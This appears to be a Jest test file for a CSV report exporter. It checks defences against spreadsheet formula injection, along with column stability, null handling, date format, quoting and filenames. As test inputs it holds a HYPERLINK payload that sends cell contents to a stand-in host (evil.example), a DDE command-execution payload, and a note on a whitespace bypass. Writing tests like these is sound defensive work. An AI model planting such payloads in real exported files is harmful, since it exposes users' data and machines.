import { exportReport, neutralise, toCsv } from "./report-export";

/*
  Ticket 13's export criterion, tested for the thing that actually goes wrong
  with it. A CSV is opened by a person who trusts it, in a program that executes
  formulas, containing text an attacker chose — a company name from a web form,
  an email subject from a stranger. Every case below is a real payload shape.
*/
describe("an exported report is data, not a program", () => {
  it("defuses the four characters a spreadsheet reads as code", () => {
    expect(neutralise("=1+1")).toBe("'=1+1");
    expect(neutralise("+1+1")).toBe("'+1+1");
    expect(neutralise("-1+1")).toBe("'-1+1");
    expect(neutralise("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("defuses the payload that actually exfiltrates a neighbouring cell", () => {
    const attack = '=HYPERLINK("https://evil.example/?"&A1,"Click for your refund")';
    const csv = toCsv(["company"], [{ company: attack }]);
    // The cell must not begin with `=` once the CSV quoting is removed.
    expect(csv).toContain(`"'=HYPERLINK`);
  });

  it("is not fooled by leading whitespace, which several readers trim first", () => {
    /*
      The bypass that defeats the naive version: a check that looks at the first
      character sees a tab and passes the cell through, and the reader then trims
      the tab and hands `=1+1` to the formula engine.
    */
    expect(neutralise("\t=1+1")).toBe("'=1+1");
    expect(neutralise("\r\n=cmd|'/c calc'!A0")).toBe("'=cmd|'/c calc'!A0");
    expect(neutralise("   @SUM(1)")).toBe("'@SUM(1)");
  });

  it("does not rely on quoting, which the parser removes before the formula runs", () => {
    // A test that asserted only `expect(csv).toContain('"=1+1"')` would pass on
    // an implementation that is completely exploitable.
    const csv = toCsv(["v"], [{ v: "=1+1" }]);
    expect(csv).not.toMatch(/(^|,)"?=1\+1/m);
  });

  it("leaves ordinary text alone, so the file is still readable by a program", () => {
    expect(neutralise("Acme Ltd")).toBe("Acme Ltd");
    expect(neutralise("2026-01-01")).toBe("2026-01-01");
    const csv = toCsv(["name", "value"], [{ name: "Acme Ltd", value: 1200 }]);
    expect(csv).toBe("name,value\r\nAcme Ltd,1200");
  });

  it("defuses a hostile column heading too", () => {
    // Headings come from a report the user built, so they are user input as
    // much as the cells are.
    expect(toCsv(["=1+1"], [])).toBe("'=1+1");
  });
});

describe("an export is the same shape every time it runs", () => {
  it("takes its columns from an explicit list, not from the first row", () => {
    /*
      A scheduled export whose columns change between runs breaks whatever reads
      it downstream — and it would, if the columns came from `Object.keys` of a
      row that happened to omit a null.
    */
    const rows = [{ a: 1 }, { a: 2, b: 3 }];
    expect(toCsv(["a", "b"], rows)).toBe("a,b\r\n1,\r\n2,3");
  });

  it("writes an empty cell for a missing value, not the word null", () => {
    expect(toCsv(["a"], [{ a: null }, { a: undefined }])).toBe("a\r\n\r\n");
  });

  it("writes dates in a form that does not change meaning between countries", () => {
    const csv = toCsv(["when"], [{ when: new Date("2026-03-04T10:00:00.000Z") }]);
    // 03/04 is two different days depending on where the file is opened.
    expect(csv).toContain("2026-03-04T10:00:00.000Z");
  });

  it("quotes a value containing a comma or a newline rather than breaking the row", () => {
    expect(toCsv(["a"], [{ a: "one,two" }])).toBe('a\r\n"one,two"');
    expect(toCsv(["a"], [{ a: 'say "hi"' }])).toBe('a\r\n"say ""hi"""');
  });
});

describe("the file has a name a person can find again", () => {
  it("names it for the report and the day it was run", () => {
    const file = exportReport(
      "Pipeline by stage / Q1",
      ["name"],
      [{ name: "Acme" }],
      new Date("2026-03-04T10:00:00.000Z"),
    );
    expect(file.filename).toBe("pipeline-by-stage-q1-2026-03-04.csv");
    expect(file.contentType).toContain("text/csv");
  });

  it("still produces a usable filename when the report name is all punctuation", () => {
    const file = exportReport("///", ["a"], [], new Date("2026-03-04T00:00:00.000Z"));
    expect(file.filename).toBe("report-2026-03-04.csv");
  });
});
